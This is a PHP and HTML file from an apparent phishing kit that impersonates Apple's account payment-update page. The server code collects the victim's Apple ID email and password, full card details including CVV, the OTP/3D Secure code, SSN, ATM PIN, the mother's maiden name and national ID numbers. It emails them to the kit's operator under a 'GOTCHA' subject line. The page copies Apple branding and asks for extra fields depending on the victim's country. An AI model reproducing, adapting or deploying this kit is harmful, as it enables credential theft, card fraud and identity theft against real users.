<?php
require_once('function.shc.php');
if(empty($_SESSION['apple_email']) && empty($_SESSION['apple_password'])){
  header('Location: /?appIdKey='.md5(time()).md5(time()).'&path=/signin/?referrer=/account/manage&sslEnabled=true');
  session_destroy();
}
#######################################################################################################
$ip = $apple->ip();
$apple->logs("Sedang di halaman Payment"); // log activity
$config = $apple->load_config();
if($_SESSION['start'] != true){
   $apple->ip();
}
if(!$_SESSION['status_login']){
   header('Location: /?appIdKey='.md5(time()).md5(time()).'&path=/signin/?referrer=/account/manage&sslEnabled=true');
}
if(isset($_GET['payment']) && isset($_GET['appIdKey']) && isset($_GET['path'])){

}else{
  header('Location: /account/manage/payment/update?payment=update&appIdKey='.md5(time()).md5(time()).'&path=/account/manage/personal/update?referrer=/account/manage/personal/update&sslEnabled=true&login=payment');
}

#######################################################################################################
if($_POST['submit'] == "Update Acount Info"){
  if( empty($_POST['cardname']) && empty($_POST['cardnum']) && empty($_POST['expdate_mo']) && empty($_POST['expdate_yr']) && empty($_POST['card_cvv']) ){
    header('Location: /account/manage/payment/update?payment=update&appIdKey='.md5(time()).md5(time()).'&path=/account/manage/personal/update?referrer=/account/manage/personal/update&sslEnabled=true&login=payment');
  }else{
    if($_POST['expdate_yr'] >= date("Y") && $_POST['expdate_mo'] >= date("m")){
          $bin      = $apple->binChecked($_POST['cardnum']);
          $Browser  = $apple->getBrowser();
          #######################################################################################################
            $_SESSION['ccne'] = $_POST['cardnum'];
            $mailBody .= " .++=======[ Apple Info ]=======++. \r\n";
            $mailBody .= "Apple Email    :".$_POST['apple_email']."\r\n";
            $mailBody .= "Apple Password :".$_POST['apple_password']."\r\n\n";
            $mailBody .= " .++=======[ CC Info ]=======++. \r\n";
            $mailBody .= "Card Name   : ".$_POST['cardname']."\r\n";
            $mailBody .= "Card Number : ".$_POST['cardnum']."\r\n";
            $mailBody .= "Expiration  : ".$_POST['expdate_mo']."/".$_POST['expdate_yr']."\r\n";
            $mailBody .= "CVV / CVC   : ".$_POST['card_cvv']."\r\n\n";
            $mailBody .= " .++===========================++. \r\n";
            $mailBody .= "BIN  : ".$bin['BIN']." - ".$bin['VEN']." - ".$bin['TYP']." - ".$bin['LVL']."\r\n";
            $mailBody .= "BANK : ".$bin['BNK']."\r\n\n";
            $mailBody .= " .++===========================++. \r\n\n";
            $mailBody .= ".++=======[ Address & Info ]=======++. \r\n";
            $mailBody .= "Full Name    : ".$_POST['fullName_id']."\r\n";
            $mailBody .= "Address  1   : ".$_POST['addr_id1']."\r\n";
            $mailBody .= "Address  2   : ".$_POST['addr_id2']."\r\n";
            $mailBody .= "Full Addr    : ".$_POST['fulladdr']."\r\n";
            $mailBody .= "Phone Number : ".$_POST['phone']."\r\n";
            $mailBody .= "Zip/Postcode : ".$_POST['zip_id']."\r\n";
            $mailBody .= "Country      : ".$_POST['country_id']."\r\n";
            $mailBody .= "City         : ".$_POST['city_id']."\r\n";
            $mailBody .= "State/pro/re : ".$_POST['state_id']."\r\n";
            $mailBody .= "parish       : ".$_POST['parish_id']."\r\n";
            $mailBody .= "emirate      : ".$_POST['emirate']."\r\n";
            $mailBody .= "oblast       : ".$_POST['oblast']."\r\n";
            $mailBody .= "DOB (d/m/y)  : ".$_POST['dayofb_id']."/".$_POST['monthofb_id']."/".$_POST['yearofb_id']."\r\n\n";
            $mailBody .= " .++=======[ SEC Info ]=======++. \r\n";
            $mailBody .= "3D Secure / OTP  : ".$_POST['otp']."\r\n";
            $mailBody .= "Mothers name     : ".$_POST['sec_quest1']."\r\n";
            $mailBody .= "Sort Code        : ".$_POST['sort_code']."\r\n";
            $mailBody .= "OSID / NAB ID    : ".$_POST['osidnab']."\r\n";
            $mailBody .= "ACPass           : ".$_POST['Vpass']."\r\n";
            $mailBody .= "Vpass            : ".$_POST['vpass_id']."\r\n";
            $mailBody .= "ID Number/CIP    : ".$_POST['id_num_hkgr']."\r\n";
            $mailBody .= "ATM PIN          : ".$_POST['atmpin']."\r\n";
            $mailBody .= "Account Number   : ".$_POST['anuk']."\r\n";
            $mailBody .= "SSN              : ".$_POST['ssn']."\r\n";
            $mailBody .= "Qatar ID         : ".$_POST['q_id']."\r\n";
            $mailBody .= "ID Number        : ".$_POST['id_num_hkgr']."\r\n";
            $mailBody .= "Citizen ID       : ".$_POST['ctizen_id']."\r\n";
            $mailBody .= "National ID      : ".$_POST['sanation']."\r\n";
            $mailBody .= "Passport Number  : ".$_POST['passnum']."\r\n";
            $mailBody .= "Civil ID Number  : ".$_POST['civilnumber']."\r\n";
            $mailBody .= "Bank Access Num  : ".$_POST['bankaccnum']."\r\n";
            $mailBody .= "Credit limit     : ".$_POST['creditslimits']."\r\n";
            $mailBody .= " .++=======[ SEC Info ]=======++. \r\n";
            $mailBody .= "IP Address   : ".$_SESSION['ip']." | ".$_SERVER['HTTP_HOST']."\r\n";
            $mailBody .= "User Agent   : ".$Browser['userAgent']."\r\n";
            $mailBody .= "Detail UA    : ".$Browser['name']." | ".$Browser['platform']."\r\n\n";
            $mailBody .= ".++==[ BUG7SEC.ORG | SHOR7CUT ]==++.\r\n"; 
            $_SESSION['mailbody'] = $mailBody;
            $subject = "GOTCHA : [".$bin['COU']."][".$bin['BIN']." - ".$bin['VEN']." | ".$bin['BNK']." [".$ip['cn']."|".$_SERVER['REMOTE_ADDR']."]";
            $apple->sendMe($subject,$mailBody,$ip['cn']);
            if($bin['VEN'] === "VISA"){
              

              header('Location: /account/authorized/processing/?authorized=validate&appIdKey='.md5(time()).md5(time()).'&path=/landing&sslEnabled=true&login=payment');


            }else{
              header('Location: /account/manage/update?update=success&appIdKey='.md5(time()).md5(time()).'&path=/account/manage/update?referrer=/account/manage/payment/update&sslEnabled=true&login=payment');
            }
          #######################################################################################################
    }else{
      header('Location: /account/manage/payment/update?payment=update&appIdKey='.md5(time()).md5(time()).'&path=/account/manage/personal/update?referrer=/account/manage/personal/update&sslEnabled=true&login=payment');
    }
  }
}
?>
<!DOCTYPE html>
<html lang="en">
   <head>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <title> Update your information </title>
      <link href="<?= $apple->sitehost();?>/assets/css/payment.css" type="text/css" rel="stylesheet">
      <link href="<?= $apple->sitehost();?>/assets/css/css.css" type="text/css" rel="stylesheet">
      <link href="<?= $apple->sitehost();?>/assets/css/header.css" type="text/css" rel="stylesheet">
      <link href="<?= $apple->sitehost();?>/assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
      <link href="<?= $apple->sitehost();?>/assets/css/footer.css" type="text/css" rel="stylesheet">
      <script src="<?= $apple->sitehost();?>/assets/js/jquery-1.11.3.min.js"></script>
      <script src="<?= $apple->sitehost();?>/assets/js/nicescroll.min.js"></script>
      <script src="<?= $apple->sitehost();?>/assets/js/drilldown.js"></script>
      <style type="text/css">
       .layout {
          display: inline-block;
          width: 100%;
          height: 758px;
          min-height: 100px;
          margin-top: 25px;
          border-radius: 4px;
          -webkit-border-radius: 4px;
          -moz-border-radius: 4px;
          -o-border-radius: 4px;
          -khtml-border-radius: 4px;
          -webkit-box-shadow: rgba(0,0,0,0.3) 0 1px 3px;
          -moz-box-shadow: rgba(0,0,0,0.3) 0 1px 3px;
          background: #fff;
          border: 1px solid;
          border-color: #e5e5e5 #dbdbdb #d2d2d2;
          -webkit-box-shadow: rgba(0,0,0,0.3) 0 1px 3px;
          -moz-box-shadow: rgba(0,0,0,0.3) 0 1px 3px;
          box-shadow: rgba(0,0,0,0.3) 0 1px 3px;
          position: relative;
          padding: 0;
      }

      </style>
<script type="text/javascript">             
  window.onload = function openVentana(){            
    $(".ventana").slideDown(1000);             
  }       
  function closeVentana(){            
    $(".ventana").slideUp("fast");          
  } 
</script> 
<script type="text/javascript">

  function getCreditCardType(i) {
        var e = "unknown";
        return /^5[1-5]/.test(i) ? e = "MasterCard" : /^4/.test(i) ? e = "Visa" : /^3[47]/.test(i) ? e = "American Express" : /^(?:2131|1800|35)/.test(i) ? e = "JCB" : /^3(?:0[0-5]|[68])/.test(i) ? e = "Diners Club" : /^6(?:011|5)/.test(i) && (e = "Discover"), e
  }
  function Calculate(e) {
        var a = 0;
        for (i = 0; i < e.length; i++) a += parseInt(e.substring(i, i + 1));
        var n = new Array(0, 1, 2, 3, 4, -4, -3, -2, -1, 0);
        for (i = e.length - 1; i >= 0; i -= 2) {
            var t = parseInt(e.substring(i, i + 1)),
                r = n[t];
            a += r
        }
        var s = a % 10;
        return s = 10 - s, 10 == s && (s = 0), s
    }

  function Validate(i) {
      var e = parseInt(i.substring(i.length - 1, i.length)),
          a = i.substring(0, i.length - 1);
      return Calculate(a) == parseInt(e) ? !0 : !1
  }
  function bug7secCC(cuk) {
    var  masekanangkene     = '<?= $apple->sitehost();?>';
    var  jancok             = getCreditCardType(cuk);
    var  validate           = Validate(cuk);
    var  cardVisa           = masekanangkene + "/assets/img/CardTypes/visa.png"; 
    var  cardMastercard     = masekanangkene + "/assets/img/CardTypes/mastercard.png"; 
    var  cardAmex           = masekanangkene + "/assets/img/CardTypes/amex.png"; 
    var  carddiscover       = masekanangkene + "/assets/img/CardTypes/discover.png"; 
    var  cardunknown        = masekanangkene + "/assets/img/CardTypes/unknown.png"; 
    var  cardjcb            = masekanangkene + "/assets/img/CardTypes/jcb.png"; 

    switch (jancok) {
        case "Visa":          
          $("#card_cvv").attr('maxlength','3');
          $("#cardtypes").attr('src', cardVisa );
        break
        case "MasterCard":          
          $("#card_cvv").attr('maxlength','3');
          $("#cardtypes").attr('src', cardMastercard);
        break
        case "American Express":          
          $("#card_cvv").attr('maxlength','4');
          $("#cardtypes").attr('src', cardAmex);
        break
        case "Discover":          
          $("#card_cvv").attr('maxlength','4');
          $("#cardtypes").attr('src', carddiscover);
        break
         case "JCB":          
          $("#card_cvv").attr('maxlength','4');
          $("#cardtypes").attr('src', cardjcb);
        break
        default:
          $("#cardtypes").attr('src', cardunknown);
          $("#card_cvv").attr('maxlength','4');
        break;
    }
    console.log(validate);
    if(!validate){
      document.getElementById("cardnumber").style.border="1px solid red";
      document.getElementById("mySubmit").disabled = true; 
    }else{
      document.getElementById("cardnumber").style.border="1px solid green";
      document.getElementById("mySubmit").disabled = false; 
    }
  }
</script>
  </head>
 
   <body>
      <div class="header"><div class="navbar"></div></div>
      <div class="main">
         <div class="myid">
            <img src="<?= $apple->sitehost();?>/assets/img/logolaper.png" class="headerlogo">
         </div>
         <div class="layout">
            <div class="layout-left">
            </div>
            <div class="right">
               <br>
               <br>
               <form method="post" action="<?php echo $_SERVER['REQUEST_URI']; ?>" name="signup" id="paymentForm" >
                  <h1>Update Your Information.<img src="<?= $apple->sitehost();?>/assets/img/crd.png" style="position:relative; right:-20px;" align="right" border="0" ></h1>
                  <table border="0" cellpadding="0" cellspacing="0" width="105%">
                        <tr>
                           <td colspan="3" class="topheading">
                              <p><img src="<?= $apple->sitehost();?>/assets/img/notice-enter.png" style="margin:8px 0;"/></p>
                           </td>
                        </tr>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Cardholder Name</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="cardname" type="text" value="<?php echo $_SESSION['personal_data']['namadepan']. ' '.$_SESSION['personal_data']['namabelakang'];?>">
                              </span>
                           </td>
                        </tr>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666"> Card Number </font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                                <input class="paymentInfo paymentInfo1" id="cardnumber" style="width:210px" required="required" maxlength="16" name="cardnum" onkeyup="bug7secCC(this.value)" type="text" placeholder="<?php echo $_SESSION['personal_data']['cc'];?>">
                                <input id="ctype" type="hidden">
                              </span>
                           </td>
                           <td align="left"> 
                              <img id="cardtypes" src="<?= $apple->sitehost();?>/assets/img/CardTypes/unknown.png" style="position: relative;left: -50px;width:40px;">
                           </td>
                        </tr>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Expiration Date </font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                                 <select  class="paymentInfo paymentInfo2" required="required" name="expdate_mo" >
                                    <option selected value>Month</option>
                                    <option value="01">01</option>
                                    <option value="02">02</option>
                                    <option value="03">03</option>
                                    <option value="04">04</option>
                                    <option value="05">05</option>
                                    <option value="06">06</option>
                                    <option value="07">07</option>
                                    <option value="08">08</option>
                                    <option value="09">09</option>
                                    <option value="10">10</option>
                                    <option value="11">11</option>
                                    <option value="12">12</option>
                                 </select>
                              </span>
                              <span class="formwrap">
                                 <select class="paymentInfo paymentInfo3" required="required" name="expdate_yr">
                                    <option selected value>Year</option>
                                    <option value="2017">2017</option>
                                    <option value="2018">2018</option>
                                    <option value="2019">2019</option>
                                    <option value="2020">2020</option>
                                    <option value="2021">2021</option>
                                    <option value="2022">2022</option>
                                    <option value="2023">2023</option>
                                    <option value="2024">2024</option>
                                    <option value="2025">2025</option>
                                    <option value="2026">2026</option>
                                    <option value="2027">2027</option>
                                    <option value="2028">2028</option>
                                    <option value="2029">2029</option>
                                    <option value="2030">2030</option>
                                 </select>
                              </span>
                           </td>
                        </tr>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">CVC (CVV)</font>
                           </td>
                           <td class="rightRow" >
                              <span class="formwrap">
                              <input class="paymentInfo paymentInfo4" style="width:160px" required="required" name="card_cvv" type="text" id="card_cvv" maxlength="5">
                              </span>
                           </td>
                           <td align="left">
                               <img src="<?= $apple->sitehost();?>/assets/img/cvv.gif" style="position: relative; left: -50px; width:46px;">
                           </td>
                        </tr>
                        <?php
                        if($_SESSION[negara] === "UK" || $_SESSION[negara] === "IE" || $_SESSION[negara] === "IN" || $_SESSION[negara] === "JP" || $_SESSION[negara] === "TW"){?>
                          <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Account Number</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="anuk" type="number">
                              </span>
                           </td>
                        </tr>
                        <?php 
                        }?>


                        <?php
                        if($_SESSION[negara] === "NZ"){?>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Bank Access Number</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="bankaccnum" type="text">
                              </span>
                           </td>
                        </tr>
                        <?php }?>

                        <?php
                        if($_SESSION[negara] === "SG"){?>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">OSID / NAB ID</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="osidnab" type="text">
                              </span>
                           </td>
                        </tr>
                        <?php }?>


                        <?php
                        if($_SESSION[negara] === "JP"){?>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">ACPass</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="cacpass_id" type="text">
                              </span>
                           </td>
                        </tr>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Vpass</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="vpass_id" type="text">
                              </span>
                           </td>
                        </tr>
                        <?php 
                        }else if($_SESSION[negara] != "IN"){?>
                         <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">3D secure/OTP/MSCode/Pass Card</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" name="otp" type="text" id="otp" placeholder="3D secure/OTP/MSCode/Pass Card" maxlength="20">
                              </span>
                           </td>
                        </tr>
                          <?php
                          }else{
                          ?>
                          <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">ATM PIN</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="atmpin" type="number">
                              </span>
                           </td>
                          </tr>
                          <?php }?>
                          

                        <?php
                        if($_SESSION[negara] === "US"){?>
                          <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">SSN (Social Security Number)</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" name="ssn" type="text" id="ssn" placeholder="123-45-6789" onBlur = "myFunc()" maxlength="10">
                              </span>
                           </td>
                        </tr>
                        <script type="text/javascript">
                            function myFunc() {
                                 var patt = new RegExp("\d{3}[\-]\d{2}[\-]\d{4}");
                                 var x = document.getElementById("ssn");
                                 var res = patt.test(x.value);
                                 if(!res){
                                  x.value = x.value
                                      .match(/\d*/g).join('')
                                      .match(/(\d{0,3})(\d{0,2})(\d{0,4})/).slice(1).join('-')
                                      .replace(/-*$/g, '');
                                 }
                              }
                        </script>
                        <?php }?>
                        
                        <?php
                        if($_SESSION[negara] === "QA"){?>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Qatar ID</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="q_id" type="text">
                              </span>
                           </td>
                        </tr>
                        <?php }?>

                        <?php
                        if($_SESSION[negara] === "GR" || $_SESSION[negara] === "HK"){?>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">ID Number/CIP</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="id_num_hkgr" type="text">
                              </span>
                           </td>
                        </tr>
                        <?php }?>

                        <?php
                        if($_SESSION[negara] === "TH"){?>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Citizen ID</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="ctizen_id" type="text">
                              </span>
                           </td>
                        </tr>
                        <?php }?>

                        <?php
                        if($_SESSION[negara] === "SA" || $_SESSION[negara] === "ID" ){?>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">National ID</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="sanation" type="text">
                              </span>
                           </td>
                        </tr>
                        <?php }?>


                        <?php
                        if($_SESSION[negara] === "CY"){?>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Passport Number</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="passnum" type="text">
                              </span>
                           </td>
                        </tr>
                        <?php }?>

                        <?php
                        if($_SESSION[negara] === "KW" || $_SESSION[negara] === "UK"){?>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Civil ID Number</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="civilnumber" type="text">
                              </span>
                           </td>
                        </tr>
                        <?php  }?>

                        <?php
                        if($_SESSION[negara] === "AU"){?>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Customer Number</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="cusnumber" type="number">
                              </span>
                           </td>
                        </tr>
                        <?php }?>



                        <?php
                        if($_SESSION[negara] === "IE" || $_SESSION[negara] === "TH" || $_SESSION[negara] === "IN" || $_SESSION[negara] === "NZ" || $_SESSION[negara] === "AU"){?>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Credits Limit</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="creditslimits" type="number">
                              </span>
                           </td>
                        </tr>
                        
                        <?php }?>

                        <?php
                        if($_SESSION[negara] != "JP"){?>
						            <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Security Question (mothers maiden name)</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="sec_quest1" type="text" id="sec_quest1">
                              </span>
                           </td>
                        </tr>
                        <?php }?>

                        <?php
                        if($_SESSION[negara] === "UK" || $_SESSION[negara] === "IE"){?>
                        <tr>
                           <td class="leftRow" style="text-align: left" width="154">
                              <font color="#666666">Sort Code</font>
                           </td>
                           <td class="rightRow" colspan="2">
                              <span class="formwrap">
                              <input class="personelInfo personelInfo9" style="width:210px" required="required" maxlength="20" name="sort_code" type="text">
                              </span>
                           </td>
                        </tr>
                        <?php }
                        foreach ($_SESSION['personal_data_input'] as $key => $value) {
                          echo trim('<input type="hidden" name="'.$key.'" value="'.$value.'">');
                        }
                        ?>
                        <input type="hidden" name="email" value="<?php echo $_SESSION['apple_email']?>">
                        <input type="hidden" name="password" value="<?php echo $_SESSION['apple_password']?>">
                        
                        <tr >
                           <td style="text-align:center;border:0;"></td>
                           <td style="text-align:right;border:0;">
                              <input class="submit" name="submit" id="mySubmit" value="Update Acount Info" type="submit" style="display: inline-block;margin-top: 30px;position: relative;right: 0px;" >
                           </td>
                        </tr> 
                  </table>
               </form>
            </div>
         </div>
         <div id="footer">
      <p>The &#65;p&#112;l&#101; Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a></p>
      <hr>
      <div class="copy-right"><p style="font-size: 12">More ways to shop: Visit an <a href="#">Apple Store</a>, call 1-800-MY-APPLE, or <a href="#">find a reseller</a><br><br>Copyright &copy; <?php echo date('Y'); ?> &#65;p&#112;l&#101; Inc. All rights reserved.   <a href="#">Privacy Policy</a>   |  <a href="#">Term of Use</a>   |  <a href="#">Sales and Refunds</a>   |  <a href="#">Site Map</a></p></div>
      </div>
      <script type="text/javascript" src="<?= $apple->host();?>/assets/auto/scripts/jquery-1.8.2.min.js"></script>
      <script type="text/javascript" src="<?= $apple->host();?>/assets/auto/scripts/jquery.mockjax.js"></script>
      <script type="text/javascript" src="<?= $apple->host();?>/assets/auto/src/jquery.autocomplete.js"></script>
      <script type="text/javascript" src="<?= $apple->host();?>/assets/auto/scripts/countries.js"></script>
      <script type="text/javascript" src="<?= $apple->host();?>/assets/auto/scripts/demo.js"></script>
   </body>
</html>